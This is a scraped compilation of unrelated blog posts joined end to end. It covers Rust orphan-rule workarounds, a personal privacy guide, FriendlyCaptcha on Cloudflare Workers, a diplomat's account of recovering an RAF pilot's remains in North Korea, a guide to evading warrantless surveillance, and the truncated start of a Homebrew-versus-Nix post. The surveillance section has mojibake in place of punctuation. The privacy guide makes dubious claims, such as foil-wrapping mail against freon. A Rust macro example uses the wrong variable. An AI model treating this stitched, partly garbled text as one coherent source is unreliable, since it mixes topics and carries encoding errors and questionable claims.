}</code></pre><p>Then in the main code we replaced all calls to register the function with the macro instead. Then we changed the function signature for the <code>get</code> method to <code>fn get&lt;T&gt;(name: &amp;str) -&gt; Option&lt;&amp;T&gt; where T: Storeable + Registered</code>. This means that if you tried to pull out a type from the <code>Store</code> but forgot to register it the compiler would fail since you didn't implement the trait for it. Perfect right? Well all was right in the world until I hit <a href="https://doc.rust-lang.org/error-index.html#E0210">E0210</a>. Remember how I said some of the types get defined in other subcrates. Well some of those types were registered prior to the change. Implementing the <code>Registered</code> trait in the type's crate also defeats the whole exercise here which is to enforce invocation of a function and make it a compile time error otherwise. We hit the Orphan Rules! Which inevitably led to this tweet in frustration trying to figure out ways to get around it.</p><figure><blockquote><p lang="en" dir="ltr">another day volunteering on the lang team. everyone keeps asking me if they can break the Orphan Rules. buddy, they wont even let me break em</p>— Michael "Free from the not free Army" Gattozzi (@mgattozzi) <a href="https://twitter.com/mgattozzi/status/1280887443370147846?ref_src=twsrc%5Etfw">July 8, 2020</a></blockquote>

<figcaption>This is a reference to a famous dril tweet. Betsy Ross if you wanna look that up.</figcaption></figure><p>Now normally the advice is make a local New Type and impl the trait on that. For instance we could do:</p><pre><code>impl Registered for Foo {}
struct Foo(ForeignType);</code></pre><p>But that means we would have to create a New Type for every single foreign type and then our calls to <code>get</code> would be the wrapped type not the actual type which is confusing because you would ask for type <code>Foo</code> in the function and get a <code>Bar</code> instead which is just bad API design in this case. Well then we could do something like this then right?</p><pre><code>// In the crate change the impl to
pub trait Registered&lt;T&gt; {}

// In our main code
impl Registered&lt;LocalType&gt; for ForeignType {} 

// And changing our function defs to
pub fn register&lt;T, U&gt;() 
  where T: Storeable + Registered&lt;U&gt;
{
  //....
}

pub fn get&lt;T, U&gt;(name: &amp;str) -&gt; Option&lt;&amp;T&gt;
  where T: Storeable + Registered&lt;U&gt;
{
  //....
}</code></pre><p>This works actually! Which is fine for the call to register but this means for <em>every single call to <code>get</code> </em>your code looks like <code>store.get::&lt;ActualType, LocalType&gt;("some name")</code> which is hardly intuitive either. We want the API to remain the same because all the caller actually cares about is the type they want out of the <code>Store</code>. We can do this with some other shennanigans though by making the <code>U</code> apart of the types themselves. By changing the types to this:</p><pre><code>use std::marker::PhantomData;

pub struct Register&lt;U&gt; {
  reg: RegMap
  _phantom: PhantomData&lt;U&gt;
}

pub struct Store&lt;U&gt; {
  inner: HashMap&lt;&amp;'static str, HashMap&lt;String, Box&lt;dyn Any + Send + Sync&gt;&gt;
  _phantom: PhantomData&lt;U&gt;
}</code></pre><p>We have constrained the local type so to speak. First we would change our macro to look like this:</p><pre><code>macro_rules! register {
  ($reg:ident, $local:ty , $type:ty) =&gt; {
    impl cratename::Registered&lt;$ty&gt; for $type {}
    $reg.register::&lt;$type&gt;();
  }
}</code></pre><p>We then would change our functions to look like:</p><pre><code>pub fn register&lt;T&gt;() 
  where T: Storeable + Registered&lt;U&gt;
{
  //....
}

pub fn get&lt;T&gt;(name: &amp;str) -&gt; Option&lt;&amp;T&gt;
  where T: Storeable + Registered&lt;U&gt;
{
  //....
}</code></pre><p>And in our impl that <code>U</code> comes from the type itself e.g. <code>impl&lt;U&gt; Store&lt;U&gt;</code>. Now the only places that need the local type to be typed out at all are function calls the <code>Store</code> gets passed to which isn't the most ideal thing, but it declutters the function calls which are arguably more important to understand.</p><h3 id="conclusion">Conclusion</h3><p>If you hit these rules yourself with similar constraints as ours, then I hope this bit of knowledge will help you overcome that hump. More often than not the New Type way should suffice, but in this case we needed something different. I'd really like if the rules could be relaxed if the crates are all in the same workspace and internal like they are at work, but I'm sure there are difficulties on figuring out if crates in a workspace are up on crates.io let alone another registry etc. etc. Nothing about designing a language is easy and there are a lot of reasons these rules do exist and are really constrained. Just like how NLL helped relax what the borrow checker would accept in terms of valid programs, I'm hoping future versions of the compiler might ease up a bit more on the rules. Either way there was at least a solution, even if it wasn't my most favorite one, but I got to learn a lot in the process and hopefully you did too!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Ever since the revelations of Edward Snowden and learning about the fact that the United States Government implements and utilizes commercial-grade equipment to spy on society, there's been an ongoing battle for personal privacy. Most don't do this because they have things to hide, but because they have important things to protect, like their banking information or previous addresses. With the rise of major technology companies and governments at the helm of new technical innovations and controlling most people's everyday lives, it becomes people's responsibility to carefully handle their personal information- both online and offline. For those unfamiliar, this blog post seeks to provide a “quick start guide” on how one can protect their info from malicious actors, governments, and so forth.</p>

<h2 id="data-aggregation">Data Aggregation</h2>

<p>How do big tech companies make money? Let's use Amazon as an example- since they are forced <em>by law</em> to disclose their earnings on all the companies they own, we can easily tell that Amazon actually LOSES MONEY on their main retail site that a user buys products on. Huh? How does this work? As it turns out, advertising companies pay vast sums of money for <em>actionable leads</em>, or information that can lead to a <em>conversion</em>, or a customer visiting their page or store and making a purchase. Naturally for a company such as Amazon to draw a profit from this, they need to collect and resell user data.</p>

<h3 id="who-on-earth-buys-this-information">Who On Earth Buys This Information?</h3>

<p>If you have visited sites similar to <a href="https://whitepages.com/" rel="nofollow">Whitepages.com</a>, odds are that you may be familiar with what this sort of data is used for. It's collected on a <em>MASSIVE</em> scale and used for marketing, Open-Source Intelligence (how hackers, the CIA and NSA all get your personal info), COVID-19 contact tracing, and more. Some of the major sites are <a href="https://intelius.com/" rel="nofollow">Intelius.com</a>, <a href="https://whitepages.com/" rel="nofollow">Whitepages.com</a>, and [Pipl.com][<a href="https://pipl.com/" rel="nofollow">https://pipl.com</a>]. Other marketing agencies may also collect your valuable private information.</p>

<h3 id="okay-how-do-i-stop-this">Okay, How Do I Stop This?</h3>

<p>If you opted to create social media accounts, there are a few ways to remove information from the internet:
– Google search yourself, deleting old accounts and opting out of sites like Whitepages.
– Pay a privacy management service online. There are several of these.
– Hire a Private Investigator to remove your information for you (this is the most expensive option).</p>

<p>Fortunately, most data aggregators have a <em>tiiiiny</em> little “DO NOT SELL MY INFORMATION” button at the bottoms of their pages, which you can utilize to remove the offending information.</p>

<h2 id="insecure-software">Insecure Software</h2>

<p>It has been proven numerous times that taking a proactive approach towards digital security is the ONLY way to mitigate security issues as they arise. Many well-known programs and systems have an extremely poor reputation for being horribly insecure, and it is recommended to avoid them at all costs. For the sake of brevity, we won't cover this in depth, but will instead provide recommended software:</p>

<p>RECOMMENDATIONS:
Operating System: Qubes OS, OpenBSD, Whonix
Password manager: Keepass X/variants
Web Browser: ungoogled-chromium, iceweasel, Tor Browser
Email service: lavabit, protonmail
Filehosting: rent a VPS in switzerland and selfhost NextCloud
Voice/Video Conferencing: Jitsi meet
Phone Calls/SMS: Signal App</p>

<h2 id="physical-security">Physical Security</h2>

<p>An important thing many people claim to have “on point” is their physical security. This may involve the installing of locks for the doors to your home, ensuring a laptop isn't left unlocked in public, etc. However, many leave gaps in what measures can be made.</p>

<h3 id="the-mail">The Mail</h3>

<p>Did you know it's possible to read other people's mail by simply holding the closed envelope to light or spraying freon gas (sold in magic shops) against the envelope, which will temporarily make the envelope transparent? As it turns out, the simplest way to prevent this from happening is to wrap your mail in foil before putting it in an envelope. This makes it resistant to light and resistant to gases like freon.</p>

<h3 id="locks-and-doors">Locks and Doors</h3>

<p>Lockpicking is a growing sport, and as a result the bypassing of doors is becoming easier and easier to perform. To ensure nobody enters rooms or buildings they aren't supposed to be in, it's <em>crucial</em> that the doors be properly fitted to their frames and have higher end locks and latches installed to deter wannabe thieves.</p>

<h2 id="what-do-hackers-do">What Do “Hackers” Do?</h2>

<p>Hackers are seen as the proverbial bad guy who attacks computers and IT infrastructure, but an etymology of the word implies that people who are hackers love to innovate and creatively solve new and interesting problems. The common worry is the “cracker”, or a person who breaks (cracks) other's security measures set in place for fun or for profit.</p>

<p>These attacks may or may not be performed with any malicious intent- just for the sake of exploration. However, this does mean that there is something to be learned. If an attacker compromises your security in any way, shape or form it is <em>critical</em> to institute a means of mitigating the way they gained access.</p>

<p>On top of this, it's not uncommon for crackers and hackers alike to be hired and found working in professions such as a Security Analyst role, due to their intense eye for detail and passion for how things work.</p>

<h2 id="without-further-ado">Without Further Ado...</h2>

<p>This is <em>by no means</em> a comprehensive guide on personal privacy, but rather a means to get started. On top of this, it's important to remember that nothing will EVER be fully secure. So, if anyone wishes to obtain that elusive private life, they will have to keep up with the times and actively work to ensure privacy is their #1 concern.</p>

<p>I will continue to post more on privacy-related content as time goes on, but since this is such a vast field it is critical that anyone concerned perform their research and due diligence.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
<p>Over the past two months I’ve built <a href="https://friendlycaptcha.com/">FriendlyCaptcha</a>, a privacy friendly alternative to Google reCAPTCHA. Normally if I were to start a new web application, I would write the server code in Golang, spin up a Postgres instance, and host a dockerized version of it on Google Cloud Run to get many of the serverless benefits.</p>
<p>For a CAPTCHA product the requirements were a bit different: it is crtical that its API is fast, always available, has predictable costs, and can scale up and down instantly. A CAPTCHA service being down is a big issue for users, they can’t verify the challenges submitted by their website visitors and face a dilemma: to allow requests without a valid challenge or to reject all requests (I propose they do the first!).</p>
<p>Serverless can be a good choice for minimizing the risk of downtime for your APIs, especially if you only have a small team. There are less moving parts, a datacenter outage doesn’t mean your service is down, and also the individual workers are more isolated and short-lived reducing the chance of an error putting your server into an unrecoverable bad state.</p>
<h2 id="cloudflare-workers">Cloudflare Workers<a href="#cloudflare-workers">#</a></h2>
<p>A couple years ago Cloudflare launched <a href="https://workers.cloudflare.com/">Workers</a>, a serverless platform that runs your code on <em>the edge</em>. That means your code runs in their datacenters all over the world, so any callee should have good latency from just about everywhere in the world.</p>
<p>Your code in a Cloudflare Worker runs in a V8 isolate which means that the overhead of cold starts is extremely small (less than 5ms), and response times in general are ridiculously fast because of this. This makes it great for server side rendering and APIs.</p>
<p>There is a catch, you have to make sure your server logic ‘fits’ within these limits:</p>
<ul>
<li>Less than 50ms of computation time for given request. Time that your script is waiting for a request does not count and not doing any computation.</li>
<li>Your code needs to either be written in Javascript or be a WebAssembly binary. Your total code bundle can only be 1MB in total size.</li>
<li>You can not use more than 128MB of memory.</li>
</ul>
<p>If you can make it work you get a whole lot in return.</p>
<h2 id="keeping-state">Keeping state<a href="#keeping-state">#</a></h2>
<p>Most applications or APIs have some state, even if it’s only secrets used for authentication. You could of course talk to your relational database of choice, but that removes any latency advantages of running code on the edge and re-introduces a single point of failure(unless you have your own globally replicated relational database, which is possible, but as we’re starting a new product here we don’t have that just yet).</p>
<p>Instead we can keep state in a few different ways:</p>
<h3 id="cache">Cache<a href="#cache">#</a></h3>
<p>Cloudflare Workers offers a cache that is at the level of a datacenter. This is useful for caching objects for minutes up to hours.</p>
<p>In FriendlyCaptcha this is how we can cache valid API keys without talking to the database every time.</p>
<h3 id="workers-kv">Workers KV<a href="#workers-kv">#</a></h3>
<p>Workers KV is a key value store that is globally distributed and eventually consistent, built into Cloudflare Workers. It is designed for infrequent writing (up to once per second), but frequent reading. This is great if you want to cache data that your worker simply forwards (e.g. a file on S3). If you frequently read from a key its value will get cached in the local edge datacenter.</p>
<p>In FriendlyCaptcha this is used to store user sessions when you log into the website.</p>
<h3 id="serverless-friendly-databases">Serverless-friendly databases<a href="#serverless-friendly-databases">#</a></h3>
<p>Workers KV is not a great place to store data such as your user’s data due to its eventual consistency and lack of powerful query support. Databases such as <a href="https://fauna.com/">FaunaDB</a> and <a href="https://cloud.google.com/firestore">Firestore</a> are a good fit for the serverless model, it’s a fully managed service and you pay for usage and data storage instead of nodes and uptime.</p>
<p>In FriendlyCaptcha it is important that the solution of a solved CAPTCHA can not be re-used, by storing all completed puzzles in FaunaDB as well as in the Cloudflare Cache we can make sure that never happens.</p>
<h2 id="website-on-the-edge">Website on the edge<a href="#website-on-the-edge">#</a></h2>
<p>By rendering the website on the edge you can achieve very quick response times and small bundle sizes, while still allowing you to use a templating engine and adapt the page to the user (e.g. for thei dashboard).</p>
<p>The <a href="https://friendlycaptcha.com/">FriendlyCaptcha website</a> is pure HTML and CSS that all gets rendered on the edge, there is no client-size Javascript. While I love frameworks like React, for a website (and many websites really) it’s overkill. By rendering the website on the edge you get something that’s in between a fully static website and a dynamic website.</p>
<p>For templating I use <a href="https://github.com/popeindustries/lit-html-server">lit-html-server</a>, and I’m happy with that choice. It’s just Javascript and template literals that you can compose in a way that makes sense for you, there was no new framework to learn.</p>
<p>For a bigger real world example of a serverside rendering approach using CloudFlare workers is the <a href="https://discord.gg/">Discord website</a>, it is so fast.</p>
<h2 id="what-are-the-advantages-of-cloudflare-workers">What are the advantages of Cloudflare Workers?<a href="#what-are-the-advantages-of-cloudflare-workers">#</a></h2>
<ul>
<li>Your code runs close to the client in multiple datacenters, you don’t have to manage any of that, and you can sleep at night knowing that a sudden hug of death probably won’t take down your service.</li>
<li>Predictable pricing, which at small to medium scale is often much lower than the classic load balancer + application servers setup.</li>
<li>Less moving parts: a single script containing all API and website logic makes life easier. Having a development, staging and production environment is easy this way.</li>
<li>If you are replacing a (SPA) you can start moving logic to the server, decreasing bundle size and the amount of endpoints you have to expose.</li>
<li>The tooling is fairly good, there’s a way to have environment variables and manage secrets, and you can preview your site/API locally.</li>
</ul>
<h2 id="what-are-some-disadvantages">What are some disadvantages?<a href="#what-are-some-disadvantages">#</a></h2>
<ul>
<li>In most serverless Javascript environments your code does not run in Node. Many libraries and client SDKs will only work in a Node environment.. I couldn’t use the SDK for BigQuery, Sentry, Mailgun or Stripe, and instead had to use their REST APIs.</li>
<li>There are limitations: only few languages are supported, 1MB max script size, 50ms runtime, 128MB of memory.</li>
<li>There is some degree of lock-in. CloudFlare workers follow the Webworker spec, so it should be fairly easy to move to another provider, but if you use any goodies such as their KV distributed datastore changing that code to use something like Redis instead will require some effort.</li>
</ul>
<h2 id="should-i-go-fully-serverless">Should I go (fully) serverless?<a href="#should-i-go-fully-serverless">#</a></h2>
<p>Probably not, think about the application that you are building and whether any of these advantages matter. You can probably start off by writing the backend logic in your preferred language and running that on a machine on your favorite cloud provider. When that single machine no longer cuts it, you can introduce more machines.</p>
<p>Remember that if you are trying to build a product, whether something costs $5 or $10 per month probably won’t make the difference between success and failure.</p>
<p>If your load is unpredictable, you require low latency, and you need reliability, then perhaps it may be the right choice. If you are building a tiny service, such as a Slack bot or a log-in wall in front of a static website, serverless is probably a great choice.</p>
<p>Finally, another good reason to use it is for fun or just to get acquainted with serverless. Limitations and constraints usually foster creative problem solving, which is perfect for hobby projects.</p>

July 16, 2020 | https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/ | <a href="https://web.archive.org/web/*/https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>To tell people that you had a close working relationship with the North Korean military for a 6 month period would in itself raise more than a few eyebrows. Working for 3 years in North Korea was on the one hand a time of frustration and on the other a time of discovery in this fascinating&nbsp;yet enigmatic country. Butting heads on a daily basis with the stifling North Korean bureaucracy was always a battle, but occasionally there was a glimmer of achievement and sometimes from the most unlikeliest of sources.</p>
<p>In early 2004, I was contacted at the embassy in Pyongyang by the brother of an RAF pilot who had been shot down in 1952 over North Korea during the Korean war. He said he had full details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he sent to me) and wished to visit the area to discover the fate of his brother.</p>
<p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p>
<p>This seemed a daunting request, but nevertheless I submitted it to the North Koreans and having gone through the usual long and tortuous channels I was surprised to receive an invitation to a meeting with senior North Korean military officers to discuss the request. Soon after therefore, it was with some degree of trepidation that I and my interpreter set off to meet these senior officers at a large military base on the outskirts of Pyongyang.</p>
<p>Driving into the base, we stopped at the entrance guard house and I was told to leave my diplomatic vehicle parked there. Then my interpreter and I climbed into a small military vehicle with an officer who my interpreter told me would be our liaison officer for the visit.</p>
<p>The base was huge. We drove past ranks of tanks, armoured vehicles and lorries which appeared to be in pristine (and highly polished) condition. I did learn later that this base was one of several in the Pyongyang garrison that supplied vehicles for the massed televised parades.</p>
<p>A short while later we pulled up outside a large office building. Our liaison officer led us in and up the stairs to a large conference room where sat several high ranking officers. There were also some junior officers milling around as well as a couple of shady looking civilians who never took their eyes off me for the whole meeting. Very disconcerting.</p>
<p>Some commands were rapped out in Korean and everyone sat down. I then outlined my request to them and also provided them with all the relevant information that had been sent to me from the UK. They listened politely. They were very courteous and the atmosphere was more relaxed than I had anticipated. When I had finished my spiel and before they responded to my request, tea was brought in and they all lit up cigarettes. As I drank my tea, they all began a long conversation amongst themselves.</p>
<p>Finally, they said they would investigate this case and get back in touch. So thinking that this was an end to the proceedings, I stood up preparing to leave, but surprisingly no, it was not quite the end. They invited me to have lunch with them, which took me completely off guard.</p>
<p>Before I could respond, another command was rapped out and a series of orderlies wheeled in trollies containing a cold buffet and drink. The buffet was well prepared but the only downside was at the end of the meeting there were several toasts which meant imbibing several shots of the lethal North Korean Soju the after effects of which I did in due course suffer!</p>
<p>So the meeting finally came to an end. I thought that after this first meeting, that would be the end of it. I would get the usual reply back saying this request was not possible to facilitate. The Korean War was something that the North Koreans revered. Museums full of captured allied equipment, films, memorials, statues and posters depicting their glorious victory abounded everywhere. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p>
<p>But surprisingly, no.</p>
<p>Against all expectations, they did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p>
<p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. This spot had been identified and human bones and fragments of uniform and aircraft were also uncovered. This scenario is somewhat similar to my previous post <a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilot’s Secret Grave Discovered In Albania</a></p>
<p>This news then led over the next six months to a long series of meetings, usually weekly either at Army HQ in Pyongyang, the crash site or at a military base on the outskirts of the city chaired on the military side by Senior Colonel Kwak Chol-hui who was to be my main point of contact for this project. I am glad to report that the two shady civilians from our first meeting never did make a reappearance.</p>
<p>The Colonel who would later go on to be promoted to Major General was responsible throughout the negotiations for arranging visits to the site, meetings with the two surviving eyewitnesses and agreeing that Flt Lt Hinton’s brother would be fast tracked for a visa and allowed to visit the DPRK site to pay his final respects to his brother.</p>
<p>True to their word, Flt Lt Hinton’s brother was granted his visa and permitted to visit the village. At a meeting we had with the military, he was offered the choice of having his brother’s remains repatriated to the south via Panmunjon or re-buried on the outskirts of the village. He chose the latter. Therefore, the military re-buried his remains in a properly marked grave and on the final day of his visit, he was part of a small, brief ceremony attended by members of the British Embassy, North Korean military and villagers.</p>
<p>Despite my requests, the North Koreans had refused to allow me to obtain a properly inscribed headstone from the Commonwealth War Graves Commission, so a simple marker was used instead. Overall, it was a small victory but did give some form of closure to the family of Flt Lt Hinton.</p>

<p>As mentioned above, I met Colonel Kwak Chol-hui (pictured above with me at a Queens Birthday Party celebration in Pyongyang) and his team on many occasions over that 6 month period. As well as working on the Hinton project, he also eased the process of enabling me to take the very rare numbers of visitors we got down to the DMZ at Panmunjon as part of their “North Korean experience”. The other was the USS Pueblo where the military arranged private tours for me (Pueblo post to follow).</p>
<p>At Panmunjon, when I took visitors down to view the DMZ, we were always hosted by the military who would lay on briefings and guides for our visitors as well as a lunch afterwards. I could always see the look of bewilderment on the faces of the South Korean border guards and US military standing a few feet away on the southern side of the demarcation line wondering who these foreigners were on the other side looking a tad too cosy with North Korean officers!</p>
<p><em><strong>Note: In 2011, the remains of Flt Lt Hinton were finally repatriated and in a ceremony at Panmunjon, the remains were passed over to military authorities in the south.</strong></em></p>

<p>In 2013, an NSA contractor leaked an internal review of project <a href="https://en.wikipedia.org/wiki/Stellar_Wind">Stellar Wind</a>, also known as the Presidentâ€™s Surveillance Program (PSP). This project, and its successors, have been the focus of at least two public hearings from the Senate Intelligence Committee - in <a href="https://www.intelligence.senate.gov/hearings/open-hearing-fisa-legislation">2013</a> and <a href="https://www.intelligence.senate.gov/hearings/open-hearing-fisa-legislation-0">2017</a>. Write-ups of these leaks, and the Senate hearings covering them, have given us a rare inside look into how the government conducts warrantless domestic surveillance. There are many articles covering general privacy and security. This article is focused on protecting you from what we know of warrantless domestic surveillance. <!--more--> If you want some background information on how we believe the governmentâ€™s mass surveillance program works, and why we recommend what we recommend, read on. Otherwise <a href="#summary">click here</a> to jump straight to our recommendations.</p>

<p>Distinguishing between a government official without a warrant and one with a warrant is important, as we believe the two have different levels of access to your personal data. When documents for the PSP were thrust into the light of day in 2013, we learned something valuable as citizens: our government was <em>trying</em> to follow the law. Granted <a href="https://www.aaup.org/brief/aclu-v-nsa-493-f3d-644-6th-cir-2007">courts have ruled</a> the program was illegal, the vice presidentâ€™s lawyer drafted an interpretation of the law arguing the program was legal. It appears the NSA invested great effort in trying to stay within that interpretation of the law. In other words, the government might <em>really</em> stretch the law when it comes to surveillance but they still try to follow it.</p>



<p>So they are watching us without a warrant. How is that legal?</p>

<p>The first Senate Intelligence Committee hearing showed us part of the legal theory they were using to justify the program: <a href="https://en.wikipedia.org/wiki/Smith_v._Maryland">Smith vs. Maryland 442 U.S. 735 (1979)</a>. Michael Lee Smith had robbed someone and was repeatedly threatening them over the phone. The police, having identified Smith as a suspect, installed a â€œbugâ€� at the phone company which would record the phone numbers Smith dialed catching him making the threatening call. They did not get a warrant to do this.</p>

<p>Smithâ€™s lawyers argued this constituted a warrantless search. They took it all the way to the Supreme Court. The verdict? Smith didnâ€™t have a reasonable expectation of privacy when he dialed the phone number. The phone number was being shared with the phone company who is known to record the numbers customers dial for billing purposes.</p>

<p>To justify mass surveillance, the government argued that â€œmetadataâ€� (more on this term later) has no reasonable expectation of privacy. If Smith vs. Maryland applies to any one person then it applies to everyone all at once. If you can record the phone number a single person dials then you can also record all of the phone numbers all of your citizens dial.</p>



<p>A central point in the governmentâ€™s mass surveillance program is distinguishing between â€œcontentâ€� and â€œmetadataâ€�. Content is the <em>actual</em> communication, like Smithâ€™s voice in a phone call. Metadata is information <em>about</em> a communication; the phone number Smith dialed. For example, when we send a letter in the mail, we could call everything inside the envelope â€œcontentâ€�; the mailing address, return address, weight, date sent, date received, postage paid, who paid the postage, etc. could be called â€œmetadataâ€�.</p>

<p>When you make a phone call, view a website, or send an email, you leave a trail of metadata about that communication. Your electronic devices frequently communicate on your behalf, without any interaction from you, leaving a trail of metadata. The government believes they have a right to record and search that metadata without needing a warrant.</p>

<p>The <a href="https://ssd.eff.org/en/module/why-metadata-matters">EFF</a> is on point when describing the problem of not applying the 4th amendment to communication metadata:</p>

<blockquote>
  <p>They know you called the suicide prevention hotline from the Golden Gate Bridge. But the topic of the call remains a secret.</p>

  <p>They know you got an email from an HIV testing service, then called your doctor, then visited an HIV support group website in the same hour. But they donâ€™t know what was in the email or what you talked about on the phone.</p>

  <p>They know you received an email from a digital rights activist group with the subject line â€œLetâ€™s Tell Congress: Stop SESTA/FOSTAâ€� and then called your elected representative immediately after. But the content of those communications remains safe from government intrusion.</p>
</blockquote>

<p>This is where it is critical to differentiate between warrantless surveillance and targeted surveillance with a warrant. If you believe the government has a warrant to search the content of your communication, then this blog post isnâ€™t going to help you. If your goal is to avoid passive warrantless searches, to keep your communication metadata from being stored in a government database, this blog post is going to walk you through the tools you can use and why we believe they work.</p>

<p>Letâ€™s take a look at some common stuff people do with tech, and the small changes you can make to prevent your data from ending up in the governmentâ€™s mass surveillance databases.</p>



<p>Most of our communication today happens over the public internet. Instead of phone calls and text messages, we use video chat and messenger apps. In addition to the metadata generated by the messages we send, the Internetâ€™s protocol generates a bunch of metadata as well: what servers your devices connect to, how much data you exchange, how frequently you visit, etc.</p>

<p>Much of this metadata centers around connecting to computers and involves something you may have heard of before: an IP address (short for internet-protocol). When you buy internet from your cable provider or cell phone carrier, they assign you an ip address for connecting to the internet - a random looking collection of numbers and dots that looks something like: 24.56.20.230. This IP address is like a mailing address. The government records this metadata in a database, keeping track of what IP address talked to what IP address, in the same way they may keep track of the sender/recipient of a letter sent via the mail.</p>

<p>This means that, from the moment we connect to the internet, the government can keep a record of everything we do. To avoid warrantless tracking, we recommend using a VPN. A VPN can obscure your IP Address by allowing your device to connect to the internet through their servers. This means the government will only be able to see that you connected to the VPN but wonâ€™t be able to see what you did through that connection without advanced traffic analysis. While a VPN can protect you from surveillance, itâ€™s important to choose your VPN provider carefully since youâ€™ll be sharing all of your internet activity with them. We trust <a href="https://mullvad.net/">Mullvad</a> for this. Mullvad is the company providing the servers for <a href="https://vpn.mozilla.org/">Mozillaâ€™s VPN</a> and has a <a href="https://mullvad.net/en/help/no-logging-data-policy/">no-nonsense privacy policy</a>.</p>

<p>Mullvad does some important things that make it the front-running pick for a VPN provider. First, they donâ€™t use user accounts. They generate a random account number for you. There is no way for Mullvad to tell who owns what account. You can put money and your account number in an envelope without a return address and send it to them. Of course, you can also pay with a credit card which will associate you with the account. Next, they keep no logs of connections and they only use the bare minimum amount of metadata necessary to route and authenticate requests. Finally, for advanced users, Mullvad supports â€œmulti-hopâ€� connections, meaning your communication is routed through multiple servers before reaching the internet.</p>

<p>We believe using a VPN provider like Mullvad will help keep your personal internet metadata out of government databases.</p>



<p>If you are wanting to communicate with one or more people, many people reach for text messaging, social media messengers, or email. Instead, we recommend <a href="https://www.signal.org/">Signal</a>.</p>

<p>Your email can be read by anyone with access to the network between you and the recipient, including all metadata about the communication. Text messages share all routing information (like phone numbers associated with a text) with the telecom provider. From what we know of government mass surveillance, the government is storing this metadata (email recipient, sender, timestamp, subject line, etc.) in a database. Similarly, they are storing text message metadata as well.</p>

<p>Signal, in contrast, takes great care to limit what data you share publicly when messaging folks. Theyâ€™ve developed some state-of-the-art tech that allows for messages to be sent with very little metadata being generated. In fact, Signal uses a technique known as â€œsealed senderâ€�, meaning itâ€™s not possible to tell who is communicating with who on the Signal network. From what we know of government bulk metadata collection, your messages sent on the Signal network will be safe from the program.</p>



<p>When browsing the web, and interacting with this technology, you generate a <em>massive</em> amount of metadata that the government can scoop up into a database.</p>

<p>We strongly recommend using <a href="https://www.mozilla.org/en-US/firefox/new/">Firefox</a> which is run by a security focused non-profit. By default, Firefox ships with a feature called DNS over HTTPS. DNS, or domain name service, is what takes a web address like â€œevertwoyears.orgâ€� and translates it into one of those IP addresses we talked about before. When you type a web address into a browser, your computer generates a DNS request that the government can store. Firefox encrypts this traffic, and resolves it using <a href="https://1.1.1.1/">CloudFlare</a>, which we believe keeps it out of government databases.</p>

<p>Once you have Firefox Installed, we recommend installing <a href="https://addons.mozilla.org/en-US/firefox/addon/https-everywhere/">HTTPS Everywhere</a>, a plugin that forces websites to encrypt all traffic you send. HTTP is the language web browsers speak when they download websites. HTTP doesnâ€™t have any protections, so just like email, anybody who has access to the network between you and the website you are viewing can see everything you do. HTTPS on the other hand encrypts almost everything. …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Don’t get me wrong: I have nothing against <a href="https://brew.sh/" target="_blank">Homebrew<sup><i></i></sup></a>, the macOS package manager that most devs who run Apple laptops use on a near-daily basis. It’s served me admirably all these years and I’ve even written some Homebrew recipes.</p><p>But I’ve become convinced that there’s a better way—or at least a way that suits my needs better. I recently switched from Homebrew to <a href="https://github.com/rycee/home-manager" target="_blank">Home Manager<sup><i></i></sup></a>, the <a href="https://nixos.org/nix" target="_blank">Nix<sup><i></i></sup></a>-based user environment manager created by <a href="https://github.com/rycee" target="_blank">Robert Helgesson<sup><i></i></sup></a>, and I’ve been extremely pleased with the results so far. Home Manager has enabled me to establish a fully <strong>declarative approach</strong> to managing my laptop environment, including my dotfiles.</p><blockquote><p>You can see my current Home Manager configuration in the <a href="https://github.com/lucperkins/nix-home-config" target="_blank">lucperkins/nix-home-config<sup><i></i></sup></a> repo, which includes</p></blockquote><h2 id="homebrew-pros">What I do like about Homebrew</h2><p>The two things I like most about Homebrew are its comprehensiveness and its ease of use. There are tons of packages, many of which have multiple versions; it’s rare that you can’t find what you need. And when you install Homebrew using the simple <a href="https://brew.sh/" target="_blank">script<sup><i></i></sup></a> on the site it pretty much Just Works out of the gate. Virtually all of the “issues” I’ve had with Homebrew have been rooted in user error or missing versions of packages. For me it’s been an indispensable tool for years and years. Kudos to the creators and maintainers!</p><h2 id="homebrew-cons">What Homebrew doesn’t get you</h2><p>The only real “problems” with Homebrew are that (a) you have to manually manage your packages via <code>brew install</code>, <code>brew rm</code>, and other <code>brew</code> commands and (b) it doesn’t enable you to manage other assets, like dotfiles (for tools like <a href="https://vim.org/" target="_blank">vim<sup><i></i></sup></a> and <a href="https://github.com/tmux/tmux" target="_blank">tmux<sup><i></i></sup></a>). Item (b) is no surprise, of course, because Homebrew doesn’t even purport to offer that. But I have always yearned for something that can do both in one go.</p><h2 id="intro">Enter Home Manager</h2><p>I’ve been a big fan of <a href="https://nixos.org/nix" target="_blank">Nix<sup><i></i></sup></a> for years. Admittedly, I tend to be a bigger fan of the philosophy behind it—a totally declarative approach to dependency management rooted in functional programming—than of the ecosystem’s tools. I find Nix the language to be unnecessarily opaque (though it’s grown on me) and setup can be daunting. I even once intended to write a book on Nix but found it a bit too daunting.</p><p>Anyway, I came across <a href="https://github.com/rycee/home-manager" target="_blank">Home Manager<sup><i></i></sup></a> for Nix a while back and filed it away in my memory until <a 